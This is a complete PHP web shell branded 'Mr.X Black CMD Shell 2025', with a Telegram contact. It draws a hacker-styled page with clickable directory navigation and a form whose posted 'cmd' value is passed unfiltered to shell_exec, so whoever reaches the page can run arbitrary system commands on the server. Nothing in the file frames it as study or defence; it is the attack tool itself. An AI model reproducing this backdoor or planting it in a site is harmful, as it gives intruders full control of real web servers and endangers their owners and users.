<?php
// Banner
echo '<!DOCTYPE html><html><head><title>Black Shell</title>
<style>
body { background-color: #000; color: #0f0; font-family: monospace; padding: 10px; }
a { color: #0ff; text-decoration: none; }
a:hover { text-decoration: underline; }
.box { border: 1px solid #0f0; padding: 10px; margin-top: 10px; background: #111; }
input[type="text"] { width: 80%; padding: 5px; background: #222; color: #0f0; border: 1px solid #0f0; }
input[type="submit"] { padding: 5px 10px; background: #0f0; color: #000; border: none; cursor: pointer; }
</style>
</head><body>';

echo "<h2>==============================<br>";
echo "   Mr.X Black CMD Shell 2025<br>";
echo "     Telegram : @jackleet <br>";
echo "==============================</h2>";

// Get current path
$current_path = isset($_GET['path']) ? $_GET['path'] : getcwd();
chdir($current_path);

// Path navigation links
$path_parts = explode('/', $current_path);
$path_links = '';
$full_path = '';
foreach ($path_parts as $part) {
    if ($part === '') continue;
    $full_path .= '/' . $part;
    $path_links .= '<a href="?path=' . urlencode($full_path) . '">' . htmlspecialchars($part) . '</a>/';
}
echo "<b>Path:</b> /" . $path_links;

// Command handler
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $output = shell_exec("cd " . escapeshellarg($current_path) . " && $cmd 2>&1");
    echo '<div class="box"><pre>' . htmlspecialchars($output) . '</pre></div>';
}

// Command form
echo '<form method="POST">
    <input type="hidden" name="path" value="' . htmlspecialchars($current_path) . '">
    <input type="text" name="cmd" placeholder="Enter command">
    <input type="submit" value="Run">
</form>';

echo '</body></html>';
